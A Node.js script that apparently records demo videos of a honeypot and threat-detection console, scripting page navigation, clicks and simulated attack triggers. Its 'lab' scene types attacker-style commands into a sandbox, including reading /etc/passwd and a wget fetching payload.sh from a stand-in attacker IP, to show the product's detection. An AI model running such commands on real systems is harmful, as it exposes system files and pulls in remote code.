// Scene scripts for the launch video. Each one drives a real console page and records it.
// usage: node scenes.js <outdir> <scene> [scene...]
const path = require('path');
const { open, sleep, closeAll } = require('./rec');

const SCENES = {
    // Event log while real SSH traffic hits the Cowrie honeypot (fired through the product's own triggers)
    live: async (out) => {
        const s = await open('events.html');
        await sleep(3000);
        // bring the live activity panel up under the app bar
        await s.page.evaluate(() => { const m = document.querySelector('.main-content'); const p = document.querySelector('.hn-grid-2'); m.scrollTop += p.getBoundingClientRect().top - 150; });
        await s.moveTo(1000, 250, 10);
        await s.start(path.join(out, 'live.frames'));
        await sleep(900);
        s.mark('fire brute force'); s.fire('ssh_bruteforce');
        await s.moveTo(690, 300, 1500);
        await sleep(6500);
        s.mark('fire session'); s.fire('ssh_session');
        await s.moveTo(760, 380, 1600);
        await sleep(6500);
        await s.stop(path.join(out, 'live.mp4'));
        await s.close();
    },

    // Analysis lab: commands typed in the sandbox are profiled and matched by the rules as they run
    lab: async (out) => {
        const s = await open('analysis_lab.html');
        await sleep(2500);
        await s.page.click('#al-start');
        const ready = await s.waitFor(() => !document.querySelector('#al-stop').disabled && (document.querySelector('.xterm-rows') || {}).innerText.trim().length > 3, 40000);
        if (!ready) throw new Error('sandbox did not start');
        await s.page.click('.terminal.xterm');
        await s.page.keyboard.type('clear'); await s.page.keyboard.press('Enter');
        await sleep(900);
        // the two rows of panels start just under the app bar
        await s.page.evaluate(() => { const m = document.querySelector('.main-content'); const t = document.querySelector('.terminal.xterm'); m.scrollTop += t.getBoundingClientRect().top - 150; });
        const term = await s.centre('.terminal.xterm');
        await s.moveTo(term.x + 60, term.y + 40, 10);
        await s.start(path.join(out, 'lab.frames'));
        await sleep(800);
        s.mark('whoami'); await s.type('whoami', 85); await sleep(250); await s.key('Enter');
        await sleep(1500);
        s.mark('passwd'); await s.type('cat /etc/passwd', 70); await sleep(250); await s.key('Enter');
        await sleep(1900);
        s.mark('wget'); await s.type('wget http://203.0.113.9/payload.sh', 55); await sleep(250); await s.key('Enter');
        await s.moveTo(term.x + 520, term.y - 40, 1200);
        await sleep(4200);
        s.mark('end');
        await s.stop(path.join(out, 'lab.mp4'));
        await s.page.click('#al-stop').catch(() => {});
        await sleep(2500);
        await s.close();
    },

    // Investigations: filter the queue, open a case, read its timeline
    investigate: async (out) => {
        const s = await open('incidents.html');
        await sleep(3500);
        await s.moveTo(1050, 330, 10);
        await s.start(path.join(out, 'investigate.frames'));
        await sleep(700);
        await s.click('#inc-q', 800);
        await sleep(250);
        s.mark('type filter'); await s.type('payload', 95);
        await sleep(1300);
        s.mark('open case'); await s.click('.inc-row', 800, 1);
        await sleep(1500);
        // bring the tabs of the case file into view
        const tab = await s.centre('#dtl-tabs .tab[data-tab="timeline"]');
        if (tab && tab.y > 560) await s.scroll(tab.y - 330, 1000);
        await sleep(350);
        s.mark('timeline'); await s.click('#dtl-tabs .tab[data-tab="timeline"]', 700);
        await sleep(2300);
        s.mark('detections'); await s.click('#dtl-tabs .tab[data-tab="detections"]', 700);
        await sleep(2300);
        await s.stop(path.join(out, 'investigate.mp4'));
        await s.close();
    },

    // MITRE ATT&CK board
    mitre: async (out) => {
        const s = await open('mitre.html');
        await sleep(3500);
        await s.moveTo(1100, 300, 10);
        await s.start(path.join(out, 'mitre.frames'));
        await sleep(600);
        await s.moveToEl('.technique-card.active[data-id="T1595"]', 900, 0, 0, -30);
        await sleep(500);
        await s.moveToEl('.technique-card.active[data-id="T1059"]', 1100, 0, 0, -40);
        await sleep(600);
        await s.scroll(330, 1500);
        await sleep(300);
        await s.moveToEl('.technique-card.active[data-id="T1110"]', 900, 0, 0, -40);
        await sleep(1800);
        await s.stop(path.join(out, 'mitre.mp4'));
        await s.close();
    },

    // Geo intelligence: turn the globe, then switch to the map
    geo: async (out) => {
        const s = await open('geo.html');
        await sleep(6000);
        const g = await s.centre('#geoGlobe');
        await s.moveTo(g.x + 120, g.y + 10, 10);
        await s.start(path.join(out, 'geo.frames'));
        await sleep(700);
        s.mark('drag 1'); await s.drag(g.x + 120, g.y + 10, g.x - 150, g.y - 10, 1900);
        await sleep(500);
        s.mark('drag 2'); await s.drag(g.x - 60, g.y - 40, g.x + 170, g.y + 50, 1700);
        await sleep(700);
        s.mark('map'); await s.click('.view-toggle button', 800, 1);
        await sleep(3200);
        await s.moveTo(g.x + 40, g.y + 60, 1100);
        await sleep(900);
        await s.stop(path.join(out, 'geo.mp4'));
        await s.close();
    },

    // Credential vault: search what attackers tried
    creds: async (out) => {
        const s = await open('credentials.html');
        await sleep(3500);
        await s.moveTo(800, 520, 10);
        await s.start(path.join(out, 'creds.frames'));
        await sleep(700);
        await s.click('input[type="search"], .dataTables_filter input, input', 800);
        await sleep(250);
        s.mark('type root'); await s.type('root', 130);
        await sleep(2200);
        await s.moveTo(760, 560, 900);
        await sleep(1500);
        await s.stop(path.join(out, 'creds.mp4'));
        await s.close();
    },

    // URL scanner: a real scan of example.com
    urlscan: async (out) => {
        const s = await open('urlscan.html');
        await sleep(3000);
        await s.moveTo(900, 420, 10);
        await s.start(path.join(out, 'urlscan.frames'));
        await sleep(600);
        await s.click('#urlInput', 800);
        await sleep(200);
        s.mark('type url'); await s.type('https://example.com', 60);
        await sleep(350);
        s.mark('scan'); await s.click('#scanBtn', 700);
        await sleep(600);
        const done = await s.waitFor(() => !document.querySelector('#scanBtn').disabled, 40000);
        s.mark(done ? 'result' : 'scan timed out');
        await sleep(1200);
        await s.scroll(300, 1300);
        await s.moveTo(820, 470, 900);
        await sleep(2000);
        await s.stop(path.join(out, 'urlscan.mp4'));
        await s.close();
    },

    // Reports: generate a real executive summary, then read it in the preview panel
    reports: async (out) => {
        const s = await open('reports.html');
        await sleep(3500);
        const before = await s.page.evaluate(() => document.querySelector('#rp-rows tr') ? document.querySelector('#rp-rows tr').innerText.slice(0, 40) : '');
        await s.moveTo(980, 250, 10);
        await s.start(path.join(out, 'reports.frames'));
        await sleep(700);
        s.mark('generate'); await s.click('.rt-card[data-type="executive_summary"] .rt-go', 900);
        const made = await s.waitFor((before) => { const r = document.querySelector('#rp-rows tr'); return r && r.innerText.slice(0, 40) !== before; }, 60000, before);
        s.mark(made ? 'generated' : 'generate timed out');
        await sleep(700);
        // scroll the history table into view
        const row = await s.centre('#rp-rows tr');
        if (row) await s.scroll(row.y - 300, 1200);
        await sleep(500);
        s.mark('preview'); await s.click('#rp-rows tr button.pv', 900);
        const shown = await s.waitFor(() => document.querySelectorAll('.pvw-pages canvas').length >= 2, 30000);
        s.mark(shown ? 'pages shown' : 'preview timed out');
        await sleep(1300);
        const pv = await s.centre('.pvw-pages');
        if (pv) await s.moveTo(pv.x, pv.y, 800);
        await s.scroll(620, 2200, '.pvw-pages');
        await sleep(900);
        await s.scroll(700, 2200, '.pvw-pages');
        await sleep(1400);
        await s.stop(path.join(out, 'reports.mp4'));
        await s.close();
    },

    // Overview: the threat map and the live feed while real probes arrive
    overview: async (out) => {
        const s = await open('dashboard.html');
        await sleep(4500);
        await s.moveTo(1150, 300, 10);
        await s.start(path.join(out, 'overview.frames'));
        await sleep(1200);
        s.mark('fire sweep'); s.fire('port_sweep');
        const feed = await s.centre('#liveFeed');
        if (feed) await s.scroll(feed.y - 380, 1600);
        await sleep(2500);
        s.mark('fire honeytrap'); s.fire('honeytrap');
        await s.moveToEl('#liveFeed', 1200, 0, 0, -60);
        await sleep(4500);
        await s.stop(path.join(out, 'overview.mp4'));
        await s.close();
    },

    // Wallboard: the full-screen dark view
    wall: async (out) => {
        const s = await open('wallboard.html', { cursor: false, dark: true });
        await sleep(7000);
        await s.start(path.join(out, 'wall.frames'));
        await sleep(1200);
        s.mark('fire dionaea'); s.fire('dionaea');
        await sleep(3200);
        s.mark('fire telnet'); s.fire('telnet');
        await sleep(3800);
        await s.stop(path.join(out, 'wall.mp4'));
        await s.close();
    },
};

(async () => {
    const [out, ...names] = process.argv.slice(2);
    for (const n of names) {
        if (!SCENES[n]) { console.log('unknown scene', n); continue; }
        try { await SCENES[n](out); } catch (e) { console.log('SCENE FAILED', n, e.message.slice(0, 300)); } finally { await closeAll(); }
    }
    process.exit(0);
})();
